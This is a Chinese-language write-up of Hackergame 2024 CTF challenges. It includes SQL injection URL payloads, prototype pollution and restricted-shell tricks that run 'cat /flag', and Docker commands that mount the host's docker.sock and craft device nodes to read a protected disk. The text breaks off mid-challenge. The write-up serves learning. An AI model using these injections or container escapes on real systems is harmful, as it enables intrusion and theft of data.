社畜第三年参加 Hackergame，第一次写 write up，不足之处请大家不吝赐教~

WARNING：第一天的精神状态很神秘，所以当天解题思路和手法比较奇妙，请坐和放宽。
## 签到
在看出题目怎么解之前，先一耳朵听出来了 BGM 是 Suno 做的。有预感今年 AI 分量不低，事实证明果然如此。
#### 最终操作
随意提交一次，然后将地址栏中的 `?pass=false` 改为 `?pass=true` 即可。
#### 解题过程
看到要输入一堆不好输入的文字以后，第一反应是 F12 写两行代码遍历所有输入框的 placeholder，将冒号后的部分复制到输入框中。

结果代码敲完以后发现有的冒号是全角，有的是半角，现有输入并不合规。不过，这会儿已经看到 `?pass=false` 了，直接一改就过了。我为什么要把签到题想得这么复杂呢……
## 喜欢做签到的 CTFer 你们好呀
#### 最终操作
1. 找到 Nebula CTF 战队的主页 https://nebuu.la/
2. 进入 web 模拟终端，跟随提示执行 help，把提供的所有指令全试一遍，发现 `env` 中的第一个 flag
3. 执行 `ls`，看到有两个目录，但是 `cd` 提示 permission denied. 使用 `sudo ls Welcome-to-USTC-Nebula-s-Homepage/`，观看奶龙全集。使用 `ls Welcome-to-USTC-Nebula-s-Homepage/` 发现打印结果与在根目录 ls 一样，并且多加多少层目录都是一样。开始怀疑这个 web 终端不是真的终端
5. F12 在 app.xxx.js 中搜索这个 Welcome-to-USTC-Nebula-s-Homepage 目录名，前后滚动一下发现有两处 base64 编码的内容。将其解开，排除 env 中已提交的那个，得到另一个 flag
#### 解题过程
因为打过前几届 Hackergame，所以知道中科大的 CTF 战队名叫 Nebula 战队。但是，如果直接在谷歌搜索“nebula 战队 招新”、“nebula ustc 战队”等关键词，出来的结果都不太对：

* https://github.com/Nebula-CTFTeam/Recruitment-2024 看起来并没有与 flag 相关的信息
* https://github.com/USTC-NEBULA 是空白的

然后在 Nebula-CTFTeam 的 GitHub 主页中，看到有一个 .github 的 repo，其中唯一一个文件 [README.md](https://github.com/Nebula-CTFTeam/.github/blob/main/profile/README.md)只有一句话，包含了到 https://nebuu.la/ 的链接，打开以后发现是个终端，觉得有戏。

结果到了终端里面就寄了，第二个 flag 正攻一直没思路，还得是发现了 ls 的异常以后去代码里才找到的。第二个 flag 找出来以后，发现居然 `ls -la` 就能直接看到 .flag，大腿拍断x1

cat 不存在文件时有 consider hidden files 提示，之前也看到了，结果我看完 Awards 和 Members 就给忘了（要不然怎么说第一天精神状态神秘呢）

最后，我是从这个题才知道 B 站居然有奶龙全集😂
## 猫咪问答（Hackergame 十周年纪念版）
###### 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？

最终操作：从 LUG 网站上找到 2015 年的活动新闻即可。

解题过程：搜索 Hackergame 2015 没有任何结果。结合之前参加 Hackergame 的经验，感觉这类新闻稿的信息都会在 https://lug.ustc.edu.cn 上面。

探索一下这个网站，找到 https://lug.ustc.edu.cn/wiki/lug/events/hackergame/ ，从年份往前推，发现 2015 年的时候这个比赛还不叫 Hackergame，只叫“信息安全大赛”。不过没关系，点进去 [第二届安全竞赛（存档）](https://lug.ustc.edu.cn/wiki/sec/contest.html) 就可以看到比赛前一天的“10 月 17 日 周六晚上 19:30 3A204 网络攻防技巧讲座”。
###### 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？

最终操作：还是在 LUG 网站，找到过去 5 年的新闻，从题解看题目数，新闻稿里直接就有人数。

解题过程：结合之前参加 Hackergame 的经验，知道题解在 https://github.com/USTC-Hackergame 上面。但是近五年还有一个 2019 年，这里却没有。

回到第一题中的 LUG 网站，查看 2019 年的比赛介绍，可以在末尾看到题解发布于 https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/ . 果然这才是最接近 25 题的一年！当年注册人数则在同一篇文章的头部。
###### Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？

最终操作：还是在 LUG 网站，找到 2018 年的题解，查看当年的猫咪问答。

解题过程：我打过的我还能不知道？笑死
> 原来猫咪问答已经存在这么多年了吗……
> 原来我已经打 Hackergame 不止三年了吗……
###### 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

最终操作：搜索 usenix security 2024 mail spoof 找到这篇论文，精读论文，其中直接提到了 336 combinations.

解题过程：论文搜索 usenix security 2024 mail ustc 没有什么结果，搜索 usenix security 2024 mail spoof 就立马有了。

论文里面提了 16 种提供商、20 种客户端，但是乘起来 320 并不对，大脑开始发光。

想了一下，论文提及了提供商的网站客户端，那是不是 16 * (16+20) = 576 呢？也不是。心里有点发毛。

把论文仔细看了一遍，发现论文中直接写出了 336 combinations 这个数字。我都在想这一次如果还没结果，我就直接搜索 combination 这个词。
最后，336 是怎么来的呢？原来忽略了网站客户端只能用在自家的网站上，所以是 16 * 20 + 16. 真实精神状态堪忧，大腿拍断x2
###### 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？

最终操作： https://github.com/torvalds/linux/commits/master/MAINTAINERS 直接看 10 月18 日的提交。

解题过程：这新闻太大了，刚发生的时候我就已经在关注，不需要任何搜索就直接看就行。
###### 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token

最终操作：找到一个在线 tokenizer https://lunary.ai/llama3-tokenizer ，把 HTML 代码粘贴进去，得到 1835，去掉自带的一个 start token 一个 end token，得到 1833，即为答案。

解题过程：搜了 llama3 tokenizer，发现就算从 HuggingFace 下到模型我也不会跑（我真不会 AI）。另外，HuggingFace 好像提供了一个单独的 tokenizer 可以下载，不需要下整个模型，不过我还是不会用，也没下。

到了晚上，再次搜索这个题的时候，就发现前面说的在线 tokenizer 了。第一次输入 1835 没过，看到有自带 token，试了下去掉后的 1833，果然过了。
## 打不开的盒
#### 最终操作
1. 打开 Bambu Studio（或者其他 3D 打印机的切片软件）
2. 执行切片，滑动预览层数的控制条，滑到盒子中间即可看到 flag
![stl](images/stl.png)
#### 解题过程

正好上半年买了 3D 打印机，一眼看出解法。氪金最有用的一次。

不过，那个数字 0 一开始真没看出来是啥玩意……
## 每日论文太多了！
#### 最终操作
1. 下载论文，Ctrl-F flag 搜到一处结果
2. 用 Word 打开论文，点击允许编辑，再次找到这个位置，发现前面有个白色图片挡住了这些文字
3. 移开白色图片，发现 flag（居然是图片而不是文本）
#### 解题过程
这个题还挺直觉的，不过是第一次知道 Word 转换 PDF 已经能把格式转得这么好了。

> 原来这题从那么久之前就开始构思了吗……
## 比大小王

#### 最终操作
1. 阅读代码，发现答案已经在 `states` 中，还自带了 `submit()` 提交方法
2. 使用浏览器 DevTools 中的 local override 功能，修改题目拉取到之后的回调函数，将答案转为需要的格式，最后插入一个 `setTimeout()` 去提交 states 中的答案。顺便把 `updateCountdown()` 注释了，以避免视觉污染
3. 反复修改 `setTimeout()` 的超时值，直到服务器接受数据

override 所用的 diff 如下：

```diff
--- 2.js	2024-11-10 10:41:44.580396600 +0800
+++ 1.js	2024-11-02 13:31:50.853622200 +0800
@@ -106,7 +106,19 @@
           state.value2 = data.values[0][1];
           document.getElementById('value1').textContent = state.value1;
           document.getElementById('value2').textContent = state.value2;
-          updateCountdown();
+
+          var res = [];
+          for (var i = 0; i < state.values.length; i++) {
+            if (state.values[i][0] < state.values[i][1]) {
+              res.push("<");
+            }  else {
+              res.push(">");
+            }
+          }
+          console.log(res);
+          state.res = res;
+          setTimeout(() => {submit(state.res)}, 200*50);
+          //updateCountdown();
         })
         .catch(error => {
           document.getElementById('dialog').textContent = '加载失败，请刷新页面重试';
```
#### 解题过程
上来看到题目以后，直接 F12 看代码分析逻辑和调用接口。然后写了一版 Python 代码去计算结果，立即提交，然后理所当然地收获了“检测到异常提交”。

但是开始做这个题的时候，我无脑冲了 F12，完全没注意到它是倒计时 5s 后自动开始游戏的（以为是拉下数据后立即开始，我这里没开始是因为被 DevTools 断点暂停），我甚至都没有看到拉下来的游戏数据里面有个 `startTime`，更不知道对手做题到底是什么速度😂看到代码里的 `startTime`，还以为是浏览器本地记录的开始时间，还在好奇 `updateCountdown()` 到底是在做什么，为什么对手是瞬间完赛而不是一点点涨进度😂

在以上这个状态下，我以为异常提交指的是 HTTP Headers 不对、前端埋点没触发之类的风控问题，好奇了一下 Hackergame 真有必要把风控做得像新闻里一样精细吗。但是 Python 里面已经把能传的都传了，前端也看了没有埋点，于是放弃 Python，改用浏览器直接提交。

然而，试了很多个点位去插入代码，都还是返回“检测到异常提交”。于是又仔细看了一遍代码，发现每次选择后要等 200ms 才能做下一次选择，于是把 `setTimeout` 等待时间改为 200 * 100 ms，这次变成提示“对手已完成”。

然后就懵逼了，不知道到底什么时间才能又不异常又算通过，干脆把 `setTimeout` 的时间一点点改短，改到 200 * 50ms 时过了。

直到一周后题解发布，我才发现原来游戏是自动开始的，并且服务器给了 `startTime` 要求 5s 后才能提交😂被自己蠢哭了
## 旅行照片 4.0
这个就不区分最终操作和解题过程了。
###### 照片拍摄的位置距离中科大的哪个校门更近？
百度或者高德地图网页版不需要登录就可以用。搜索图片上很明显的“科里科气科创驿站”，根据返回结果里的街景图~~以及名字~~筛一下，很容易找到是“科里科气科创驿站（科大站）”。

观察四周进入蓝色大学区域的道路，放大每个路口，有校门的话会显示出来，找到最近的即可。注意有些路口确实是没有门的。

~~为什么你校那么大个中校区在东边和南边没有门啊，试了半天，还以为是地图 app 没放大够~~
###### 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？
说到 ACG 那必然是 B 站有相关信息了。B 站搜索“中科大 acg 音乐会”，发现有个账号叫“中科大LEO动漫协会”，简介里提到了 Leo 酱，于是深入研究。翻完今年的动态，就可以看到有一张照片包含了此信息。
###### 这个公园的名称是什么？
照片上很明显的彩虹色跑道，右边垃圾桶有“六安园林”几个字。谷歌搜索“彩虹跑道 六安”，一发入魂：[彩虹跑道、灯光喷泉！六安城区这两所公园又变美了](https://www.sohu.com/a/498872898_100023473)
###### 这个景观所在的景点的名字是？
试了半天石头的描述词，都没找到。于是把图片拿去谷歌、百度以图搜图，很快就得到结果。
###### 距离拍摄地最近的医院是？
不会做，先跳过。
###### 左下角的**动车组型号**是？
谷歌搜索“四编组动车”，看到有专门的网站介绍动车。~~居然在 2024 年还能有这样的网站存在，铁道迷们吃得也太好了吧~~

有 CRH6F-A 和 CRH6A-A 两个型号，都是 CRH6 系列的。同时注意到图片上列车的涂装类似于 Persona 的面具，根据这个特征去翻了网站上的图片，很遗憾没找到（官方题解说是顶上轮播图就有，但是我今天都是这个精神状态了，你猜我能不能看到这第一张轮播图）。

拿 CRH6 去百度搜索，发现百度百科中有一张图就是这个涂装，可以很清晰地看到是“怀密号”，于是填写它的型号即可。
###### 距离拍摄地最近的医院是？
知道了是怀密号以后，就能知道它的运行路线。图上这里看起来像是火车的停车站、检修站一类的东西。谷歌搜索“动车 维护站”，得知这种地点的学名叫“动车运用所”。高德搜索“北京 动车运用所”，找到怀密线附近的唯一一处，然后周围一看就能知道是哪家医院了。~~医院就在旁边不会吵吗~~
## 不宽的宽字符
#### 最终操作
示例代码里面加几行：

```c
    char req[] = "Z:\\theflag";
    char out[256];
    memcpy(buf, req, sizeof(req));
    WideCharToMultiByte(CP_UTF8, 0, buf, 6, out, 256, NULL, NULL);
    FILE* fp;
    fopen_s(&fp, "W:\\text.txt", "w");
    fwrite(out, 20, 1, fp);
    fclose(fp);
```

然后将 W:\text.txt 内容复制出来粘贴到题目中即可。
#### 解题思路
我知道 Windows 喜欢用 UTF-16，所以看到这个题目描述一眼盯帧就知道是把 UTF-8 形式的 `Z:\\theflag\0` 按照 UTF-16 读出来就行。

因为代码里面已经有了一个 `MultiByteToWideChar`，所以我想用 `WideCharToMultiByte` 就可以。为了偷这个懒（而不是直接用 Python / VSCode 做这个转换），我硬是下了半小时 Visual Studio. 下载半小时，解题一分钟。
## PowerfulShell
#### 最终操作
1. 列出还没有被禁用的字符：`123456789~$-_+={}[]|: <space> <backtick>`，注意到 `_` 可以用来组成不同变量名
2. 找到所有 bash 的隐含变量：搜索 bash builtin variable，阅读 https://tldp.org/LDP/abs/html/internalvariables.html ，以及问 ChatGPT `$` 开头的内置变量有哪些
3. 修改题目提供的 Docker 容器，使其脚本接受所有输入的指令而不退出，依次打印出前面这些隐含变量的值，发现有用的有 `~=/players` `$-=hB` `$_=input`，借助 `${var:start:len}` 的截取功能就可以拼出指令
4. 目标是 `cat /flag`，分解如下：
	1. `c` 暂时没有
	2. `a` 在 `~` 中
	3. `t` 在 `$_` 中
	4. `/` 在 `~` 中，但因为不能用 0 作为偏移量，所以得把 `~` 重复两次，从后一次提取
	5. `f` 暂时没有
	6. `la` 在 `~` 中
	7. `g` 暂时没有
5. 注意到 `~` 里面有 `l` 和 `s`，用 `ls /` 可以拿到大量目录名，其中就有我们要的 `(et)c` 和 `flag` 一整个文件名
6. 整合以上分析，输入如下：
```sh
__=$_                                         # __=input
___=~                                         # ___=/players
____=$-                                       # ____=hB
_____=$___$___                                # _____=/players/players
______=${_____:8:1}                           # ______=/
_______=`${___:2:1}${___:7:1} $______`        # _______=$(ls /)
${_______:15:1}${___:3:1}${_______:7:1} $______${_______:17:4} # cat /flag
```
#### 解题过程
一开始是懵逼的，但找到未被禁用的字符，并且想到不同长度的 `_` 可以用作不同变量名、先前设置的变量可以一直留在环境中之后，豁然开朗。

可惜好景不长，一开始 `/` 因为不能用 0，死活拼不出来，直到意识到变量可以拼两遍，从后面一遍提取。想到的时候骂了自己一句傻逼。

接下来是拼不出 `c`。我第一个想到的方案是，用 `~user` 的方式取到其他用户的家目录名去拼，也找到了一个叫 lp 的用户，其家目录里面有 c. 可惜试了半天都无法实现二次展开，`~lp` 一直都无法展开为需要的目录，只得放弃。然后就想到了 `ls /`，一看里面啥字母应有尽有，还直接有 `flag`，大腿拍断x3

> 后来听群友说，变量名用 `_1` `_2` 就可以，不需要搞 brain fuck 弄一堆下划线😅
## Node.js is Web Scale
#### 最终操作
1. View Source 后可以看出能够通过 `__proto__` 将数据添加到 Array 原型
2. 回到网页上，Set key=`__proto__.a` value=`cat /flag`
3. 点击 View Source，将最后的 `cmd=execute` 改为 `cmd=a` 即可
#### 解题过程
这题其实一开始我就意识到有 `__proto__` 这么回事，还试过过 `cmd=__proto__` 发现可以拿到一个 object 让程序崩溃，但就可惜没想到通过它传递数据。

看着解出的人数一路飙涨，我就想我脑子该不会有问题吧这都做不出来。又去搜了一下 MDN 对 prototype 的介绍，看到“prototype chain”这个词的一瞬间，解法就出来了。果然我还是认知太浅薄了。
## PaoluGPT
#### 最终操作
1. 查看题目附件，了解数据库结构里面有 `contents`、`shown` 两列，且当前数据是过滤了 `shown=true` 的
2. 随便点一个聊天记录链接，网址最后加上 `' and 0=1 or contents like '%flag%';--`，页面拉到最底，出第一个 flag
3. 重置网址，网址最后改为 `' and 0=1 or shown=false;--` 出第二个 flag
#### 解题过程
看到数据库结构之后手写网址注入就行，不需要上工具，很快啊。

构造思路是，先用 `'` 关闭查询字符串来满足 SQL 语法，然后用 `and 0=1` 让现有的 conversation id 条件无效，再用 `or` 补充自己要的查询条件就可以了。`;--` 是结束当前语句，将代码中结尾的 `'` 视作注释，避免语法错误。最后这个 `;--` 是现查的，自己折腾了一会儿关闭引号，发现远不如这个方便。

另外查了下其他注入手法，发现有用 union 完全打破现有查询的。我用 union select 试了下找出有多少个 `shown=false` 的条目、除了 `messages` 是否还有其他表，都没啥用，还是基于最初代码里给出的结构就可以做了。

~~相比于注入，要注意到在 114514 行的空格之后有 flag 才比较难一点。要不是 DevTools 里面有行号，我早就把网页关了~~
## 强大的正则表达式
数学苦手，只会做第一问。
#### 最终操作 | 解题过程
人工计算 16 的倍数，人工归纳后几位的规律，直到之前的数字没有规律（0-9 都出现）为止。

规律按位数从少到多来看。只将最后一位视为规律的话，之前的位数仍有规律且太复杂，无法匹配。将末两位视为规律，用 `for i in $(seq 1 10000); do echo $((16*$i));done|grep '00$'` 观察到特定尾数下前面数字的规律。可以发现有 `00|16|32|48|64|80|96` 或 `12|28|44|60|76|92` 或 `08|24|40|56|72|88` 或 `04|20|36|52|68|84` 这四组情况，每组前面的数字都是同样的，且以 4 为规律递增。

按 4 递增的规律也一样找：遍历每种末位数字，写出前一数字的允许范围，然后将前一数字也纳入规律，直到更前面的数字不再有规律（0-9 都出现）就成了。

以上四组的规律是：

```
(\d*[02468][048]|\d*[13579][26]|[048])?(00|16|32|48|64|80|96)
(\d*[13579][37]|\d*[02468][159]|[159])?(12|28|44|60|76|92)
(\d*[13579][048]|\d*[02468][26]|[48])?(08|24|40|56|72|88)
(\d*[02468][37]|\d*[13579][159]|[37])?(04|20|36|52|68|84)
```

答案即为这四组连起来的结果：

```
((\d*[02468][048]|\d*[13579][26]|[048])?(00|16|32|48|64|80|96)|(\d*[13579][37]|\d*[02468][159]|[159])?(12|28|44|60|76|92)|(\d*[13579][048]|\d*[02468][26]|[48])?(08|24|40|56|72|88)|(\d*[02468][37]|\d*[13579][159]|[37])?(04|20|36|52|68|84))
```
无法匹配位数只有几位的情况，不过随机到的可能性挺低的，不管了，反正能过😂

后面两问我知道和 DFA 有关系，也找到了一些示例代码，甚至还有 https://s3.boskent.com/divisibility-regex/divisibility-regex.html 这样的在线生成任意整除判断 regex 的程序，但还是数学基础不牢，思路地动山摇。前面这个网页生成的 13 倍数的 regex，有 10M 级别的长度，也没办法输入到网页中，本题止步于此。

> 题解发布后，经群友提醒，第二问是二进制数字为 13 倍数，不是十进制，于是网站生成的结果仅有 5K 字节，可以提交的。~~已经不是大腿拍断这个级别了，死了算了~~
## 惜字如金 3.0
数学苦手，只会做第一问。
#### 最终操作 | 解题过程
补完 Python 函数名，白送分。

第二问除了爆破也没思路了，第三问看都没看。本题止步于此。
## 优雅的不等式
数学苦手，只会做第一问。
#### 最终操作 | 解题过程
要求一个函数，使其在 `[0,1]` 上积分为 pi - 8/3.

先去问 ChatGPT 看什么函数在 `[0, 1]` 上积分为 pi，并且只能用加减乘除幂。它先给出了 `f(x)=pi`，笑死。补充只能用整数的限制后，给出了 `f(x)=4/(1+x^2)`.

然后就是自行发挥补充 -8/3 的部分了，要找一个函数使其在 `[0, 1]` 的积分是 8/3. 我就随便想了一个一次函数且经过 (1,2)（也就是前述 `f(1)` ），那么 x=0 处 y 需要是 10/3，这样就满足此积分。能过就过，不能过就算了。结果，诶还真过了！于是答案是 `f(x)=4/(1+x**2) - (-4*x/3 + 10/3)`

后面 40 连问没胆量看，爬了。
## 无法获得的秘密
#### 最终操作 | 解题过程
1. 计划是用 `hexdump -C /secret | more` + 录屏做 OCR，计算知需要按 900 多次空格。同时看到了分辨率可以改，但是因为 900 次还在时间限制内，默认大小录屏也更精准，所以不想改了。
2. 计算一下 VNC 帧率，大概能有 15fps 以上，于是找 ChatGPT 编写 AutoHotkey 脚本每隔 110ms 按一次空格，按 920 次，大概 2 分钟左右完成。视卡顿情况调整间隔。
```
; Wait for 5 seconds （等待录屏启动、鼠标移开）
Sleep 5000

; Loop 920 times to press the Space key
Loop 920
{
    Send "{Space}"
    Sleep 110
}
```
3. 谷歌搜索 python find similar images，用来提取出视频中指定区域的非重复帧，知道了 OpenCV `matchTemplate()` 这个函数
4. 问 ChatGPT 如何给视频里的每一帧做 OCR，得到结果用 Tesseract。结合前文函数跳过重复帧，开始做 OCR，但是 LSTM 的结果很差，O01l 不分都是小事了，竟然还能把一个 1 识别成 1l 两位，完全不敢用
5. 结合 `matchTemplate()`，想到一个办法：
	1. 手动测量画面上每个十六进制字母的位置（画出行列网格）
	2. 预先截取 0-9a-f 十六个字符的图片
	3. 对画面上每个十六进制字母的位置，`matchTemplate({0-9a-f}.png)` 重复十六次，找出相似度最高的那个字符图片，记为结果
6. 实测以上方法效果极佳，零误识别，于是开始完整操作：
	1. 再次录制前述翻页视频，作为丢画面的双备份（NVIDIA ShadowPlay 的画质真高啊）
	2. Handbrake 裁剪视频，裁到只剩下十六进制文本区域，同时注意像素宽高比需要改为 1:1
	3. 编写如下脚本，提取非重复帧存为图片：
```python
import cv2

def analyze_video(video_path):
	# Open the video file
	cap = cv2.VideoCapture(video_path)
	frame_count = 0

	if not cap.isOpened():
		print("Error: Could not open video.")
		return

	last_frame = None
	while cap.isOpened():
		ret, frame = cap.read()

		if not ret:
			break

		if last_frame is not None:
			c = cv2.matchTemplate(last_frame, frame, cv2.TM_CCOEFF_NORMED)
			if c >= 0.95:
				#print("Too similar " + str(c) + " " + str(frame_count))
				frame_count += 1
				continue
			else:
				#print("Not similar " + str(c) + " " + str(frame_count))
				print(f"Saving frame {frame_count}")
				last_frame = frame
		else:
			last_frame = frame

		roi_frame = frame

		gray_roi = cv2.cvtColor(roi_frame, cv2.COLOR_BGR2GRAY)

		cv2.imwrite(f"frames2/{frame_count}.png", gray_roi)
		frame_count += 1

	# Release the video capture object
	cap.release()


# Usage example
video_path = "try2.mp4"
analyze_video(video_path)
```

	4. 编写如下脚本，并发 16 进程识别这些图片，每帧结果存入文本文件：

```python
import cv2
from os import listdir, getpid
from os.path import isfile
from multiprocessing import Process


area_y = [ # 手动测量的每行起始位置
	0,
	27,
	58,
	89,
	120,
	151,
	182,
	212,
	243,
	274,
	304,
	335,
	366,
	396,
	427,
	458,
	488,
	519,
	550,
	580,
	611,
	641,
	673,
	702,
	734,
	764,
	795,
	825,
	856,
	887,
	918,
	948,
	978,
	1009,
	1040,
	1069
]

area_x = [ # 手动测量的每行每块字符起止、分隔位置
	[0, 17, 33, 50, 66, 82],
	[113, 130, 147],
	[162, 179, 195],
	[211, 228, 245],
	[259, 275, 292],
	[307, 324, 341],
	[356, 372, 389],
	[404, 421, 436],
	[452, 469, 485],
	[517, 533, 550],
	[565, 582, 599],
	[613, 631, 647],
	[661, 679, 694],
	[710, 728, 744],
	[759, 775, 792],
	[807, 824, 840],
	[856, 873, 889]
]


SYMS = {}

for i in range(0, 0x10):
	SYMS[i] = cv2.imread(f"syms/{i:x}.png")

l = listdir("frames2")

def analyze_file_list(l):
	print(f"{getpid()} Process with {len(l)} pictures started")
	for entry in l:
		full_entry = f"frames2/{entry}"
		if not isfile(full_entry):
			continue

		print(full_entry)
		frame = cv2.imread(full_entry)

		with open(f"ocr2/{entry}.txt", "w") as f:
			for y_idx in range(1, len(area_y)):
				curr_y_start = area_y[y_idx - 1]
				curr_y_end = area_y[y_idx]

				for region in area_x:
					for x_idx in range(1, len(region)):
						curr_x_start = region[x_idx - 1]
						curr_x_end = region[x_idx]

						digit = frame[curr_y_start:curr_y_end,
									curr_x_start:curr_x_end]

						latest_match_val = 0
						latest_match_sym = ""
						for sym in SYMS:
							res = cv2.matchTemplate(
								digit, SYMS[sym], cv2.TM_CCOEFF_NORMED)
							_, max_val, __, ___ = cv2.minMaxLoc(res)
							# print(f"... matching {sym}, max val {max_val}")
							if max_val > latest_match_val:
								latest_match_sym = sym
								latest_match_val = max_val
						# print(f"... matched {latest_match_sym:x} @ {latest_match_val}")
						if latest_match_val < 0.85:
							print(
								f"Warning: {full_entry} X:{curr_x_start}:{curr_x_end} Y:{curr_y_start}:{curr_y_end} {latest_match_val} {latest_match_sym}...")

						if latest_match_val >= 0.5:  # < 0.5 is not identified
							f.write(f"{latest_match_sym:x}")
					f.write(" ")
				f.write("\n")
	print(f"{getpid()} Process with {len(l)} pictures end")


PROCESSES = 16
ln = len(l)
slic = int(ln / PROCESSES)

ps = []
for i in range(0, PROCESSES):
	st = i * slic
	en = (i + 1) * slic
	if i == PROCESSES - 1:
		en = ln
	ps.append(Process(target=analyze_file_list, args=(l[st:en],)))

for p in ps:
	p.start()

for p in ps:
	p.join()
```

	5. 文件名改为偏移量，方便排序：

```sh
for i in *; do h=$(head -c5 $i); echo $i $h; mv $i $h.txt;done
```

	6. 对第二份录屏重复以上操作，得到新一批以偏移量为名的文件，执行 `for i in ../ocr2/*; do bas=$(basename $i); if [ ! -f $bas ] ; then echo MISSING $i; cp $i .; fi; done` 将缺少的文件合并过来，现在应该偏移量齐全了
	7. 按顺序合并文件：

```sh
ls -1 > sorted # 文件名排序
for i in `cat sorted`; do cat $i >> merged; done # 按顺序合并文件
```

	8. 编写一个确认偏移量是否按顺序的脚本：

```python
#!/usr/bin/python3

import re

with open("ocr/merged", "r") as f:
    last_ofs = 0
    lin=0
    for line in f:
        lin+=1
        p = line.split(" ")
        ofs = p[0]

        if re.match(r"^[0-9a-f]{5}", ofs) is None:
            print(lin)
            raise Exception(ofs)
        ofs_int = int(ofs, base=16)

        if ofs_int - last_ofs != 0 and ofs_int - last_ofs != 0x10:
            print(f"Missing: {ofs_int:x} {last_ofs:x}")
        last_ofs = ofs_int
```

	7. 检查发现没有丢帧，但是有重复的。将其删除，检查通过，然后恢复文件：

```sh
sed -ri 's/^.{5}//g' merged # 删除偏移量字符
xxd -r -p merged out.bin
```

	8. 检查 out.bin 的 MD5，对上了终端，提交！
## Docker for Everyone Plus
### No Enough Privilege
#### 最终操作 | 解题思路
1. 确认环境：可以以低权用户执行镜像，可以从 stdin 导入镜像，搜索知可使用 screen 的自动捕获 rz 功能来上传文件
	1. 愣了一下才想起来 `docker image load` 可以从 stdin 读取，还想没参数能干啥呢
	2. rz 在 readonly 的 ~ 下直接提示 skipped 而没有其他错误信息，touch 了下才发现只读，是真逆天啊
2. 思路直接来了：如果我在镜像里先做好一个低权用户能访问的块设备节点，是不是就可以了？
3. 使用如下 Dockerfile 制作镜像，基于 busybox 制作，保证小体积。然后用 `docker save` 导出镜像。
```Dockerfile
FROM busybox:latest
  

RUN mknod /node1 b 253 16 && chmod 777 /node1 && chown 1000:1000 /node1
RUN mknod /node2 b 259 3 && chmod 777 /node2 && chown 1000:1000 /node2 # 这个是本地测试用的

CMD sh -c "while true; do sleep 10; done"
```
4. 发现运行时虽然节点有了、权限对了，但 cat 还是提示 permission denied. 搜索发现还需要一个 `--device` 参数来允许访问设备，测试 OK，提交！

最终命令是：

```sh
cd /tmp
rz # 上传 docker save | gzip 的镜像
zcat 1.tar.gz | sudo docker image load
sudo docker run --rm -u 1000:1000 --device /dev/vdb -it hgtest sh
# 容器 shell 内输入 cat /node1 即可
```
### Unbreakable!
#### 最终操作 | 解题思路
1. 确认环境：相比前一题，`--device` 被禁掉了，还多了一个 `--security-opt=no-new-privileges`.
	1. 搜索了一下，后者是禁用 setsuid binary 的。原来上一问还有这个方法啊！之前参加 Hackergame 就知道 setsuid binary 的花式操作了，但没记到脑子里，这下有了
2. 设计思路：本地测试发现，不用 `--device` 的话即便有正常的 root 权限也无法访问设备节点，也就是说只靠特制容器镜像直接读，肯定是不行的。那么有什么跳出容器的方法呢？
	* 看到没有限制 `-v`，那么就有经典操作：将宿主的 Docker daemon socket mount 到容器内，通过容器内 docker client 操作宿主去绕开 sudo 限制执行命令
	* 虽然 socket 会沿用宿主权限，1000:1000 无法访问，但 sudo 参数也没说不能指定多个 `-u`，因此再给出一个 `-u 1000:103` 使得当前用户处于 docker 组，就可以在容器内访问 Docker daemon socket 了
	* 走过的一些弯路：
		* 研究了一下能否通过 image load 流程的读出宿主上的其他文件，比如 tar 有没有什么机制能引用外部文件、container spec 有没有规定什么字段能读宿主文件，结果都没有（也不该有）
		* 研究了一下 `docker run` 能否读取外部文件，发现一个 `--labels-file` 和 `--env-file` 可以，但 /dev/vdb 的内容并不符合格式，没有用
		* 看到普通用户可以访问 /var/log/docker.log，想通过 load 某种无效 image 让 Docker 把 /dev/vdb 读出来写到这里面，但没找到方法
3. 可行性验证：执行下面命令，确认 Docker daemon socket 可以访问：
```sh
cd /tmp
rz # 还是前面那个镜像
zcat 1.tar.gz | sudo docker image load
sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 -u 1000:103 -v /var/run/docker.sock:/var/run/docker.sock -it hgtest sh
# 容器内 cat /var/run/docker.sock 出现 no such device or address 而非 permission denied 即为成功
```
4. 编写完整操作，首先更新 Dockerfile 将 docker client 复制进去。因为 Docker 是 Go 程序，因此只需要复制本体就可以，不用管依赖库。
```Dockerfile
FROM busybox:latest

RUN mknod /node1 b 253 16 && chmod 777 /node1 && chown 1000:1000 /node1
RUN mknod /node2 b 259 3 && chmod 777 /node2 && chown 1000:1000 /node2

COPY /usr/bin/docker /docker

CMD sh -c "while true; do sleep 10; done"
```
5. 题目终端执行：
```sh
cd /tmp
rz # 新镜像
zcat 1.tar.gz | sudo docker image load
sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 -u 1000:103 -v /var/run/docker.sock:/var/run/docker.sock -it hgtest sh
# 容器内按第一问的操作执行 docker run --rm --device /dev/vdb -it hgtest sh
# 再在新的容器内执行 cat /node1 即可
```
## 看不见的彼方：交换空间
### 小菜一碟
#### 最终操作 | 解题思路
没有 seccomp 了好耶，直接开个 socket 按照一端“读-发-收-写”、一端“读-收-发-写”的顺序对着传就行了，直接覆盖到原始文件上，无需额外内存。真计算开销的话，无非是一边有一个 buffer、一边有两个 buffer，微不足道。

（这一问没留原始 C 代码，代码被改成下一问的了）

### 捉襟见肘
#### 最终操作 | 解题思路
这一问如果沿用第一问的思路，很容易想到是将一个大文件内容换进两个小文件里，然后将大文件切开、小文件合并。但是切分与合并都无法”原地“完成，后半段文件一定会占用双倍内存，爆掉限制，因此需要一种方法来避免切分与合并。

抠了一会儿脑袋，设想出这样一种方法：
1. 从后向前交换文件内容，这样可以让每一段内容交换完毕后都执行 `ftruncate()` 将其从源文件中即时清除掉，保证内存中同一份内容只出现一次
